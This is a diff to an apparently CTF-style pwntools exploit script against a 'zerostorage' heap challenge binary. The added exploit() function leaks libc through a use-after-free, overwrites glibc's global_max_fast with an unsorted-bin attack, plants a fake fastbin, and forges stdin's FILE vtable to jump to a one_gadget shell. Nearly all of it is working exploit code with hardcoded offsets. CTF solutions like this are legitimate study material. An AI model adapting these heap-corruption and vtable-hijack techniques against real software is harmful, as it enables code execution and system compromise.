@@ -133,11 +133,67 @@ def debug():
 	payload += p64(0xcafebebe)*2 + p64(vtable) + p64(one_gadget)
 
 	insert(payload.ljust(0xe0,"\x00"))
-	#gdb.attach(p,gdbscript = "b *0x%x"%bp)
+	gdb.attach(p,gdbscript = "b *0x%x"%bp)
 	
-	# trigger malloc_printerr
-	insert("A"*0x100,interact=True)
+	payload = "7".ljust(8,"\x00")+p64(0x11111111)+p64(0x22222222)+p64(0x33333333)
+	p.sendline(payload)
 	p.interactive()
 
+def exploit():
+	global p
+	libc = ELF("./libc.so.6")
+	p = process("./zerostorage",env={"LD_PRELOAD":"./libc.so.6"})
+
+	insert("A"*0x8)
+	insert("B"*(0xe8/2))
+
+	merge(0,0)
+	data = view(2)
+
+	main_arena_top = u64(data[:8])
+	LIBC = main_arena_top + 0x7f4782d31000 - 0x7f47830ef7b8
+	target = LIBC + 0x3C0B40
+
+	original_val = u64(p.leak(target,8))
+
+	log.info("LIBC: 0x%x"%LIBC)
+	log.info("main_arena.top: 0x%x"%main_arena_top)
+
+	update(2,p64(0xdeadbeef)+p64(target - 0x10))
+	insert("C"*0x8)
+
+	new_val = u64(p.leak(target,8))
+
+	log.success("global_max_fast overwritten: 0x%x --> 0x%x"%(original_val,new_val))
+	log.success("now all bins are managed as fastbins")
+
+	merge(1,1)
+	
+	fd = LIBC + 0x3bf6bf - 0x8 #size: 0xFF(0xF0)
+
+	log.info("our fake fastbin located at: 0x%x"%fd)
+
+	data = p64(fd)+p64(0)
+	update(3,data.ljust(0xe0,"\x00"))
+
+	insert("\xcc"*0xe0)
+
+	# overwrite stdin's vtable
+
+	io_flush_lockp = 0x7BF10 + LIBC
+	bp = LIBC + 0x7C05B
+
+	fake_wide_data = LIBC + 0x7f05dc50a6b0 - 0x7f05dc14b000 - 0x18
+	vtable = LIBC + 0x7f36a3236720 - 0x7f36a2e77000 - 0x18
+	one_gadget = LIBC + 0xe681d
+	
+	payload = "A" + p64(0xdeadbeef)*3 + p64(fake_wide_data) + p64(0xdeadbeef)*3 + p64(1) #setting mode to 1 and forging wide_data structure
+	payload += p64(0xcafebebe)*2 + p64(vtable) + p64(one_gadget)
+
+	insert(payload.ljust(0xe0,"\x00"))
+	
+	p.interactive()
+
+
 if __name__ == "__main__":
-	debug()
+	exploit()
